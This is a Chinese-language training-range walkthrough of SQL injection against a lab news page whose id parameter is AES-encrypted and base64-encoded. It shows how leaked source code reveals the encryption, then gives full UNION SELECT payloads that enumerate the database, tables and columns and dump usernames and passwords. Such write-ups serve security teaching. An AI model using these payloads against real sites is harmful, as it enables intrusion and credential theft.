# SQL注入漏洞测试(参数加密)

标签（空格分隔）： 网络安全

---

## 背景介绍
> 此WEB业务环境对参数进行了AES加密，为了防止参数产生SQL注入，也是防止SQL注入产生的一种方法，但是这种方式就安全了么？

## 目标
> 1、掌握信息泄露的方式；
2、了解AES加解密；
3、了解PHP的基本语法；
4、掌握手工SQL注入；
5、了解MySQL数据库的结构；

## 解题方向
> 通过SQL注入方式，获取WEB业务系统的账号密码进行登录。

## 解题步骤
### 1、访问靶场链接，点击新闻
![image_1g4ce92i313ng8uc15r91jnm18e89.png-302.2kB][1]
### 2、将新闻的IP地址复制出来，并用工具来扫描，并访问扫描到的URL，将list.zip下载下来
![image_1g4ceapbs15el1v8e1vt9175a4r2p.png-123.2kB][2]
![image_1g4ceb5gvftjpbvq0nphssjb16.png-54.2kB][3]
![image_1g4cec9601620cj71v1410u2d981j.png-50.3kB][4]
### 3、观察压缩文件中的代码文件，并搜索对应的函数，可以发现是AES加密
![image_1g4cef4c211tijqi1r7u19b31ahb20.png-175.9kB][5]
![image_1g4cefl221jlcg6919qb5utc12d.png-23.1kB][6]
### 4、继续分析代码中的内容，并百度对应函数中参数的作用
![image_1g4cejdh5g836c484rqsv1gaa2q.png-190.9kB][7]
### 5、这里利用base64加了两次密，是因为AES最后输出结果的时候会进行一次base64加密
![image_1g4celrd4k0u1nbc270j9b1r7a37.png-181.4kB][8]
### 6、在URL中拿到对应的加密字符串先进行base64解密
 ![image_1g4cenkso1are9erla3hd2joh41.png-126.8kB][9]
 ![image_1g4ceoahl1t08o4v11v3140u135j4e.png-104.3kB][10]
### 7、将得到的解密字符串再进行AES解密，不要忘记填入所需的参数
![image_1g4cerqec13vr1qmlj921c9nh6qm.png-210.5kB][11]
### 8、最后获得解密后的字符串“1_mozhe”，源码中的程序会将"_mozhe"过滤掉
![image_1g4cf0shu3c01of6fno75mas79.png-176.4kB][12]
### 9、所以最终的URL为“http://124.70.71.251:45510/news/list.php?id=1_mozhe”
![image_1g4cg6h4s59ud96g1b1ac71kt81j.png-122.6kB][13]
### 10、反之逆序构造payload
**先将注入字符串末尾添加_mozhe字符，然后AES加密
因为AES加密默认已进行了一次base64加密，所以aes加密后再进行一次base64加密即可**
> 1. 构造payload: 1 and 1=2 union select 1,2,3,4_mozhe
 2. AES加密：0hMY7i4yFMb48GTM7O6GEhC/aK/c5wZlGbKBlWq6dPiKpflFaOD6AYj0DW05TpSj
 3. base64加密：MGhNWTdpNHlGTWI0OEdUTTdPNkdFaEMvYUsvYzV3WmxHYktCbFdxNmRQaUtwZmxGYU9ENkFZajBEVzA1VHBTag==
 
![image_1g4cgemu41t5514as9q417ple019.png-211.1kB][14]
![image_1g4cgf5m41q0m3vc17q1vlsjo6m.png-105kB][15] 
### 访问之后得知2为标题，3为内容
![image_1g4cgir0vbn8lngca1pga1r601g.png-94.7kB][16]
### 以此类推，找数据库名
> 1 and 1=2 union select 1,database(),version(),4_mozhe
得出数据库mozhe_Discuz_StormGroup

### 找表名
> 1 and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.TABLES where TABLE_SCHEMA='mozhe_Discuz_StormGroup' limit 0,1_mozhe
得出第一个表：StormGroup_member

### 找字段名
> 一般name，password，status字段在第二个字段以后
1 and 1=2 union select 1,COLUMN_NAME,COLUMN_TYPE,4 from information_schema.COLUMNS where TABLE_SCHEMA='mozhe_Discuz_StormGroup' and TABLE_NAME='StormGroup_member' limit 1,1_mozhe
得到第二个字段为name
第三个字段为password
第四个字段为status

### 找用户名、密码和状态
> 1 and 1=2 union select 1,CONCAT(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1_mozhe
得到第一个用户名，密码，状态

---

> 1 and 1=2 union select 1,CONCAT(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 1,1_mozhe
得到第二个用户名，密码，状态

---

> 或者
1 and 1=2 UNION SELECT 1,2,group_concat(name,password),4 from StormGroup_member _mozhe
显示所有用户名密码

### 将密码解密并且登录
![image_1g4ch9o0tbbovgo1imh1d7bv9jm.png-110.5kB][17]
![image_1g4chakhl1liqg3h1kc6tsf3c13.png-437.7kB][18]


  [1]: http://static.zybuluo.com/corn/twi5glq3foksblokzbxgjjfk/image_1g4ce92i313ng8uc15r91jnm18e89.png
  [2]: http://static.zybuluo.com/corn/z7e7a44f88ski1etj4pemff6/image_1g4ceapbs15el1v8e1vt9175a4r2p.png
  [3]: http://static.zybuluo.com/corn/bgarzvbln271o5htr4obsylj/image_1g4ceb5gvftjpbvq0nphssjb16.png
  [4]: http://static.zybuluo.com/corn/8ztvhmbnh03813eoshb2j704/image_1g4cec9601620cj71v1410u2d981j.png
  [5]: http://static.zybuluo.com/corn/4yuev39cvg15if7za8pf5h7y/image_1g4cef4c211tijqi1r7u19b31ahb20.png
  [6]: http://static.zybuluo.com/corn/i0g79mbnwikxlcwwsdpnlzyi/image_1g4cefl221jlcg6919qb5utc12d.png
  [7]: http://static.zybuluo.com/corn/s49uq74vc7vkhbb82a289jmy/image_1g4cejdh5g836c484rqsv1gaa2q.png
  [8]: http://static.zybuluo.com/corn/x18i6y0edp2wnruf2o3ufkbj/image_1g4celrd4k0u1nbc270j9b1r7a37.png
  [9]: http://static.zybuluo.com/corn/18g88pgv8lmuevcf86l10rbu/image_1g4cenkso1are9erla3hd2joh41.png
  [10]: http://static.zybuluo.com/corn/vgew6mkbhvzyifrxy8nazf04/image_1g4ceoahl1t08o4v11v3140u135j4e.png
  [11]: http://static.zybuluo.com/corn/wo87c5cj3nr9ssabmr8gzk4u/image_1g4cerqec13vr1qmlj921c9nh6qm.png
  [12]: http://static.zybuluo.com/corn/8uf692a36yx0x4fgmx2uwobi/image_1g4cf0shu3c01of6fno75mas79.png
  [13]: http://static.zybuluo.com/corn/6rxf9z0rxevy88t9jjvm1in2/image_1g4cg6h4s59ud96g1b1ac71kt81j.png
  [14]: http://static.zybuluo.com/corn/728dnqhxuf4gd8ir3x93vrqc/image_1g4cgemu41t5514as9q417ple019.png
  [15]: http://static.zybuluo.com/corn/8anqaq30euhybtt7pfejh79q/image_1g4cgf5m41q0m3vc17q1vlsjo6m.png
  [16]: http://static.zybuluo.com/corn/qwvi8qsvomfqsaiab03kvpxl/image_1g4cgir0vbn8lngca1pga1r601g.png
  [17]: http://static.zybuluo.com/corn/zh4v3jus3sci5iknrpx3e41r/image_1g4ch9o0tbbovgo1imh1d7bv9jm.png
  [18]: http://static.zybuluo.com/corn/fgb6zprsjmo01vn72gpdfge1/image_1g4chakhl1liqg3h1kc6tsf3c13.png